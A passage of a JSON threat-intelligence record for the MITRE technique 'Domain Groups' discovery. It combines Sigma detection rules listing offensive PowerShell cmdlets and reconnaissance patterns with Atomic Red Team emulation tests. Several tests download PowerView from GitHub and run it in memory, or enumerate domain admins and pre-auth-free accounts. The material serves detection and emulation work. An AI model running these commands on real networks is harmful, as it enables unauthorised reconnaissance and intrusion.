- Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - PoshModule\n",
                            "sigma:id": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                            "title": "Malicious PowerShell Commandlets - PoshModule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                        "lookup_data": {
                            "description": "Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/21\ndescription: Detects the use of a renamed Adfind.exe. AdFind continues to be seen\n  across majority of breaches. It is used to domain trust discovery to plan out subsequent\n  steps in the attack chain.\ndetection:\n  condition: 1 of selection* and not filter\n  filter:\n    Image|endswith: \\AdFind.exe\n  selection_1:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\n  selection_2:\n  - Imphash:\n    - bca5675746d13a1f246e2da3c2217492\n    - 53e117a96057eaf19c41380d0e87f1c2\n  - Hashes|contains:\n    - IMPHASH=BCA5675746D13A1F246E2DA3C2217492\n    - IMPHASH=53E117A96057EAF19C41380D0E87F1C2\n  selection_3:\n    OriginalFileName: AdFind.exe\nfalsepositives:\n- Unknown\nid: df55196f-f105-44d3-a675-e9dfb6cc2f2b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/01\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Renamed AdFind Detection\n",
                            "sigma:id": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                            "title": "Renamed AdFind Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine\n  Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias\n  Michalski, Austin Songer\ndate: 2017/03/05\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_1:\n    ScriptBlockText|contains:\n    - Get-SystemDriveInfo\n    - C:\\ProgramData\\Amazon\\EC2-Windows\\Launch\\Module\\\n  filter_2:\n    ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.\n      All Rights Reserved'\n  selection:\n    ScriptBlockText|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\n- id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf\n  type: obsoletes\n- id: 83083ac6-1816-4e76-97d7-59af9a9ae46e\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ScriptBlock\n",
                            "sigma:id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                            "title": "Malicious PowerShell Commandlets - ScriptBlock",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                        "lookup_data": {
                            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/20\ndescription: Detects command line parameters used by Bloodhound and Sharphound hack\n  tools\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|contains:\n    - \\Bloodhound.exe\n    - \\SharpHound.exe\n  selection2:\n    CommandLine|contains:\n    - ' -CollectionMethod All '\n    - ' --CollectionMethods Session '\n    - ' --Loop --Loopduration '\n    - ' --PortScanTimeout '\n    - '.exe -c All -d '\n    - Invoke-Bloodhound\n    - Get-BloodHoundData\n  selection3:\n    CommandLine|contains|all:\n    - ' -JsonFolder '\n    - ' -ZipFileName '\n  selection4:\n    CommandLine|contains|all:\n    - ' DCOnly '\n    - ' --NoSaveCache '\n  selection5:\n  - Product|contains: SharpHound\n  - Description|contains: SharpHound\n  - Company|contains:\n    - SpecterOps\n    - evil corp\nfalsepositives:\n- Other programs that use these command line option and accepts an 'All' parameter\nid: f376c8a7-a2d0-4ddc-aa0c-16c17236d962\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://github.com/BloodHoundAD/BloodHound\n- https://github.com/BloodHoundAD/SharpHound\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: Bloodhound and Sharphound Hack Tool\n",
                            "sigma:id": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                            "title": "Bloodhound and Sharphound Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "75df3b17-8bcc-4565-b89b-c9898acef911",
                        "lookup_data": {
                            "description": "Detects the execution of a AdFind for Active Directory enumeration",
                            "raw": "author: FPT.EagleEye Team, omkar72, oscd.community\ndate: 2020/09/26\ndescription: Detects the execution of a AdFind for Active Directory enumeration\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - objectcategory\n    - trustdmp\n    - dcmodes\n    - dclist\n    - computers_pwdnotreqd\n    Image|endswith: \\adfind.exe\nfalsepositives:\n- Administrative activity\nid: 75df3b17-8bcc-4565-b89b-c9898acef911\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/05/12\nreferences:\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md\n- https://thedfirreport.com/2020/05/08/adfind-recon/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Suspicious AdFind Execution\n",
                            "sigma:id": "75df3b17-8bcc-4565-b89b-c9898acef911",
                            "title": "Suspicious AdFind Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2aed01ad-3df3-4410-a8cb-11ea4ded587c",
                        "lookup_data": {
                            "mitre-attack-id": "T1069.002",
                            "mitre-cti:description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
                            "mitre-cti:name": "Domain Groups",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-21T12:55:51.337Z', 'name': 'Domain Groups', 'description': 'Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\\n\\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).', 'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.1', 'x_mitre_contributors': ['Harshal Tupsamudre, Qualys', 'Miriam Wiesner, @miriamxyra, Microsoft Security'], 'x_mitre_data_sources': ['Process: OS API Execution', 'Group: Group Enumeration', 'Process: Process Creation', 'Command: Command Execution'], 'type': 'attack-pattern', 'id': 'attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c', 'created': '2020-02-21T21:15:06.561Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1069/002', 'external_id': 'T1069.002'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "968eef52-9cff-4454-8992-1e74b9cbad6c",
                        "lookup_data": {
                            "description": "Detects activity as \"net user administrator /domain\" and \"net group domain admins /domain\"",
                            "raw": "author: Florian Roth (Nextron Systems), Jack Croock (method), Jonhnathan Ribeiro (improvements),\n  oscd.community\ndate: 2017/03/07\ndescription: Detects activity as \"net user administrator /domain\" and \"net group domain\n  admins /domain\"\ndetection:\n  condition: selection\n  selection:\n    AccessMask: '0x2d'\n    EventID: 4661\n    ObjectName|endswith:\n    - '-500'\n    - '-512'\n    ObjectName|startswith: S-1-5-21-\n    ObjectType:\n    - SAM_USER\n    - SAM_GROUP\nfalsepositives:\n- Administrator activity\nid: 968eef52-9cff-4454-8992-1e74b9cbad6c\nlevel: high\nlogsource:\n  definition: The volume of Event ID 4661 is high on Domain Controllers and therefore\n    \"Audit SAM\" and \"Audit Kernel Object\" advanced audit policy settings are not configured\n    in the recommendations for server systems\n  product: windows\n  service: security\nmodified: 2022/08/22\nreferences:\n- https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.002\n- attack.t1069.002\n- attack.s0039\ntitle: Reconnaissance Activity\n",
                            "sigma:id": "968eef52-9cff-4454-8992-1e74b9cbad6c",
                            "title": "Reconnaissance Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "31d68132-4038-47c7-8f8e-635a39a7c174",
                        "lookup_data": {
                            "description": "Detects potential Active Directory enumeration via LDAP",
                            "raw": "author: Adeem Mawani\ndate: 2021/06/22\ndescription: Detects potential Active Directory enumeration via LDAP\ndetection:\n  condition: (generic_search and not narrow_down_filter) or suspicious_flag\n  generic_search:\n    EventID: 30\n    SearchFilter|contains:\n    - (groupType:1.2.840.113556.1.4.803:=2147483648)\n    - (groupType:1.2.840.113556.1.4.803:=2147483656)\n    - (groupType:1.2.840.113556.1.4.803:=2147483652)\n    - (groupType:1.2.840.113556.1.4.803:=2147483650)\n    - (sAMAccountType=805306369)\n    - (sAMAccountType=805306368)\n    - (sAMAccountType=536870913)\n    - (sAMAccountType=536870912)\n    - (sAMAccountType=268435457)\n    - (sAMAccountType=268435456)\n    - (objectCategory=groupPolicyContainer)\n    - (objectCategory=organizationalUnit)\n    - (objectCategory=Computer)\n    - (objectCategory=nTDSDSA)\n    - (objectCategory=server)\n    - (objectCategory=domain)\n    - (objectCategory=person)\n    - (objectCategory=group)\n    - (objectCategory=user)\n    - (objectClass=trustedDomain)\n    - (objectClass=computer)\n    - (objectClass=server)\n    - (objectClass=group)\n    - (objectClass=user)\n    - (primaryGroupID=521)\n    - (primaryGroupID=516)\n    - (primaryGroupID=515)\n    - (primaryGroupID=512)\n    - Domain Admins\n    - objectGUID=\\*\n    - (schemaIDGUID=\\*)\n  narrow_down_filter:\n    EventID: 30\n    SearchFilter|contains:\n    - (domainSid=*)\n    - (objectSid=*)\n  suspicious_flag:\n    EventID: 30\n    SearchFilter|contains:\n    - (userAccountControl:1.2.840.113556.1.4.803:=4194304)\n    - (userAccountControl:1.2.840.113556.1.4.803:=2097152)\n    - '!(userAccountControl:1.2.840.113556.1.4.803:=1048574)'\n    - (userAccountControl:1.2.840.113556.1.4.803:=524288)\n    - (userAccountControl:1.2.840.113556.1.4.803:=65536)\n    - (userAccountControl:1.2.840.113556.1.4.803:=8192)\n    - (userAccountControl:1.2.840.113556.1.4.803:=544)\n    - '!(UserAccountControl:1.2.840.113556.1.4.803:=2)'\n    - msDS-AllowedToActOnBehalfOfOtherIdentity\n    - msDS-AllowedToDelegateTo\n    - msDS-GroupManagedServiceAccount\n    - (accountExpires=9223372036854775807)\n    - (accountExpires=0)\n    - (adminCount=1)\n    - ms-MCS-AdmPwd\nid: 31d68132-4038-47c7-8f8e-635a39a7c174\nlevel: medium\nlogsource:\n  definition: 'Requirements: Microsoft-Windows-LDAP-Client/Debug ETW logging'\n  product: windows\n  service: ldap_debug\nmodified: 2022/12/28\nreferences:\n- https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726\n- https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1\n- https://github.com/BloodHoundAD/SharpHound3/blob/7d96b991b1887ff50349ce59c80980bc0d95c86a/SharpHound3/LdapBuilder.cs\n- https://medium.com/falconforce/falconfriday-detecting-active-directory-data-collection-0xff21-c22d1a57494c\n- https://github.com/fox-it/BloodHound.py/blob/d65eb614831cd30f26028ccb072f5e77ca287e0b/bloodhound/ad/domain.py#L427\nstatus: test\ntags:\n- attack.discovery\n- attack.t1069.002\n- attack.t1087.002\n- attack.t1482\ntitle: Potential Active Directory Reconnaissance/Enumeration Via LDAP\n",
                            "sigma:id": "31d68132-4038-47c7-8f8e-635a39a7c174",
                            "title": "Potential Active Directory Reconnaissance/Enumeration Via LDAP",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1069.002",
                "display_name": "Permission Groups Discovery: Domain Groups",
                "atomic_tests": [
                    {
                        "name": "Basic Permission Groups Discovery Windows (Domain)",
                        "auto_generated_guid": "dd66d77d-8998-48c0-8024-df263dc2ce5d",
                        "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Permission Groups Discovery PowerShell (Domain)",
                        "auto_generated_guid": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7",
                        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "user": {
                                "description": "User to identify what groups a user is a member of",
                                "type": "string",
                                "default": "$env:USERNAME"
                            }
                        },
                        "executor": {
                            "command": "get-ADPrincipalGroupMembership #{user} | select name\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Elevated group enumeration using net group (Domain)",
                        "auto_generated_guid": "0afb5163-8181-432e-9405-4322710c0c37",
                        "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "net groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Find machines where user has local admin access (PowerView)",
                        "auto_generated_guid": "a2d71eee-a353-4232-9f86-54f4288dd8c1",
                        "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Find local admins on all machines in domain (PowerView)",
                        "auto_generated_guid": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd",
                        "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Find Local Admins via Group Policy (PowerView)",
                        "auto_generated_guid": "64fdb43b-5259-467a-b000-1b02c00e510a",
                        "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "computer_name": {
                                "description": "hostname of the computer to analyze",
                                "type": "path",
                                "default": "$env:COMPUTERNAME"
                            }
                        },
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)",
                        "auto_generated_guid": "870ba71e-6858-4f6d-895c-bb6237f6121b",
                        "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Computer must be domain joined.\n",
                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"
                            },
                            {
                                "description": "Requires the Active Directory module for powershell to be installed.\n",
                                "prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n"
                        }
                    },
                    {
                        "name": "Adfind - Query Active Directory Groups",
                        "auto_generated_guid": "48ddc687-82af-40b7-8472-ff1e742e8274",
